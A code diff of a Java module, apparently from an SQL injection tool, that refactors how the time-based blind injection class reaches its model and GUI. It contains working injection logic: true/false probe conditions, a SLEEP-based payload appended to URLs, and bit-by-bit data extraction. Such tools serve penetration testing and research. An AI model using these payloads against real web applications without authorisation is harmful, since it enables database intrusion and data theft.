@@ -25,10 +25,10 @@ import java.util.concurrent.TimeUnit;
 
 import com.jsql.exception.PreparationException;
 import com.jsql.exception.StoppableException;
-import com.jsql.model.InjectionModel;
 import com.jsql.model.Interruptable;
 import com.jsql.model.Stoppable;
 import com.jsql.model.bean.Request;
+import com.jsql.view.GUIMediator;
 
 /**
  * This module runs injection with method time based, which is defined as the following:
@@ -43,14 +43,10 @@ public class TimeInjection {
     // Waiting time in seconds, if response time is above then the SQL query is false
     private long timeMatch = 5;
 
-    // Reference to the model for proxy setting, stop preparation, communication with the view, HTTP requests
-    private InjectionModel model;
-
     // Time based works by default, many tests will change it to false if it isn't confirmed
     boolean isTimeInjectable = true;
 
-    public TimeInjection(InjectionModel newModel){
-        model = newModel;
+    public TimeInjection(){
 
         // Every FALSE SQL statements will be checked, more statements means a more robust application
         String[] falseTest = {"true=false","true%21=true","false%21=false","1=2","1%21=1","2%21=2"};
@@ -59,7 +55,7 @@ public class TimeInjection {
         String[] trueTest = {"true=true","false=false","true%21=false","1=1","2=2","1%21=2"};
 
         // Check if the user wants to stop the preparation
-        if(model.stopFlag)return;
+        if(GUIMediator.model().stopFlag)return;
 
         /**
          *  Parallelize the call to the FALSE statements, it will use inject() from the model
@@ -74,8 +70,7 @@ public class TimeInjection {
         try {
             listFalseMark = executorFalseMark.invokeAll(listCallableFalse);
         } catch (InterruptedException e) {
-            this.model.sendDebugMessage(e);
-            model.sendErrorMessage("Current thread was interrupted while waiting.");
+        	GUIMediator.model().sendDebugMessage(e);
         }
         executorFalseMark.shutdown();
 
@@ -85,16 +80,16 @@ public class TimeInjection {
          */
         try {
             for(Future<TimeCallable> falseMark: listFalseMark){
-                if(model.stopFlag)return;
-                if(((TimeCallable) falseMark.get()).isTrue()){
+                if(GUIMediator.model().stopFlag)return;
+                if(falseMark.get().isTrue()){
                     isTimeInjectable = false;
                     return;
                 }
             }
         } catch (InterruptedException e) {
-            this.model.sendDebugMessage(e);
+            GUIMediator.model().sendDebugMessage(e);
         } catch (ExecutionException e) {
-            this.model.sendDebugMessage(e);
+            GUIMediator.model().sendDebugMessage(e);
         }
 
         /**
@@ -110,7 +105,7 @@ public class TimeInjection {
         try {
             listTrueMark = executorTrueMark.invokeAll(listCallableTrue);
         } catch (InterruptedException e) {
-            this.model.sendDebugMessage(e);
+            GUIMediator.model().sendDebugMessage(e);
             return;
         }
         executorTrueMark.shutdown();
@@ -121,16 +116,16 @@ public class TimeInjection {
          */
         try {
             for(Future<TimeCallable> falseMark: listTrueMark){
-                if(model.stopFlag)return;
-                if(!((TimeCallable) falseMark.get()).isTrue()){
+                if(GUIMediator.model().stopFlag)return;
+                if(!falseMark.get().isTrue()){
                     isTimeInjectable = false;
                     return;
                 }
             }
         } catch (InterruptedException e) {
-            this.model.sendDebugMessage(e);
+            GUIMediator.model().sendDebugMessage(e);
         } catch (ExecutionException e) {
-            this.model.sendDebugMessage(e);
+            GUIMediator.model().sendDebugMessage(e);
         }
     }
 
@@ -174,8 +169,7 @@ public class TimeInjection {
                 try {
                     success = taskExecutor.awaitTermination(0, TimeUnit.SECONDS);
                 } catch (InterruptedException e) {
-                    this.model.sendDebugMessage(e);
-                    model.sendErrorMessage("Current thread was interrupted while waiting.");
+                    GUIMediator.model().sendDebugMessage(e);
                 }
                 if (!success) {
                     // awaitTermination timed out, interrupt everyone
@@ -227,15 +221,15 @@ public class TimeInjection {
                         Request interaction = new Request();
                         interaction.setMessage("MessageBinary");
                         interaction.setParameters("\t"+new String(e)+"="+str);
-                        this.model.interact(interaction);
-                    }catch(NumberFormatException err){
-                        this.model.sendErrorMessage("Error during time conversion.");
+                        GUIMediator.model().interact(interaction);
+                    }catch(NumberFormatException err){ // byte string not fully constructed : 0x1x010x
+                        /* Ignore */
                     }
                 }
             } catch (InterruptedException e) {
-                this.model.sendDebugMessage(e);
+                GUIMediator.model().sendDebugMessage(e);
             } catch (ExecutionException e) {
-                this.model.sendDebugMessage(e);
+                GUIMediator.model().sendDebugMessage(e);
             }
         }
 
@@ -244,7 +238,7 @@ public class TimeInjection {
             taskExecutor.shutdown();
             taskExecutor.awaitTermination(15, TimeUnit.SECONDS);
         } catch (InterruptedException e) {
-            this.model.sendDebugMessage(e);
+            GUIMediator.model().sendDebugMessage(e);
         }
 
         // Build the complete final string from array of bits
@@ -326,7 +320,7 @@ public class TimeInjection {
 
     // Run a HTTP call via the model
     public String callUrl(String urlString){
-        return model.inject(model.insertionCharacter + urlString);
+        return GUIMediator.model().inject(GUIMediator.model().insertionCharacter + urlString);
     }
 
     /**
@@ -335,14 +329,14 @@ public class TimeInjection {
      * @throws PreparationException
      */
     public boolean isTimeInjectable() throws PreparationException{
-        if(model.stopFlag)
+        if(GUIMediator.model().stopFlag)
             throw new PreparationException();
 
         TimeCallable blindTest = new TimeCallable("+and+if(0%2b1=1,1,SLEEP("+timeMatch+"))--+");
         try {
             blindTest.call();
         } catch (Exception e) {
-            this.model.sendDebugMessage(e);
+            GUIMediator.model().sendDebugMessage(e);
         }
 
         return isTimeInjectable && blindTest.isTrue();
